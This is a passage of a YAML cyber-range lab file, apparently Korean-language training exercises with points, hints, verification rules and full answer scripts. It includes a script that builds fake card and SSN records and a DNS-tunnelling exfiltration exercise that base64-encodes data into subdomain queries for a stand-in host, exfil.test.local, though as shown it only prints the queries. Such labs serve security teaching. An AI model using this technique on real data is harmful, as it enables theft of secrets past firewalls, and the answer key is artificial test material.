    \        f.write(f'{name},{email},{card},{ssn}\\n')\nprint('Generated 100 fake records')\n\" && wc -l /tmp/sensitive_data.csv"
  risk_level: low
- order: 2
  instruction: DNS 터널링을 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 base64로 인코딩하여 DNS TXT 쿼리에 포함시키는 스크립트를 작성하라.
  hint: 데이터를 63바이트 청크로 분할하여 서브도메인에 포함한다.
  category: exploit
  points: 10
  answer: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\n# DNS Exfiltration Simulation\nDATA=$(head -5 /tmp/sensitive_data.csv | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration\
    \ Simulation ===\"\necho \"Total encoded size: ${#DATA} bytes\"\necho \"Chunk size: $CHUNK_SIZE bytes\"\necho \"Estimated queries: $(( (${#DATA} + CHUNK_SIZE - 1) / CHUNK_SIZE ))\"\necho \"\"\nwhile\
    \ [ ${#DATA} -gt 0 ]; do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n    DATA=${DATA:$CHUNK_SIZE}\n    echo \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\n    SEQ=$((SEQ + 1))\n    if [ $SEQ -ge\
    \ 5 ]; then echo \"... (truncated)\"; break; fi\ndone\nSCRIPT\nbash /tmp/dns_exfil.sh"
  answer_detail: DNS Exfiltration(T1048.001)은 DNS 프로토콜을 데이터 전송 채널로 악용한다. 데이터를 base64 인코딩 후 DNS 레이블 최대 길이(63바이트)에 맞춰 분할하여 서브도메인으로 전송한다. DNS는 거의 모든 네트워크에서 허용되므로 방화벽 우회에 효과적이다.
  verify:
    type: output_contains
    expect: DNS Exfiltration
  target_vm: attacker
  script: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\n# DNS Exfiltration Simulation\nDATA=$(head -5 /tmp/sensitive_data.csv | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration\
    \ Simulation ===\"\necho \"Total encoded size: ${#DATA} bytes\"\necho \"Chunk size: $CHUNK_SIZE bytes\"\necho \"Estimated queries: $(( (${#DATA} + CHUNK_SIZE - 1) / CHUNK_SIZE ))\"\necho \"\"\nwhile\
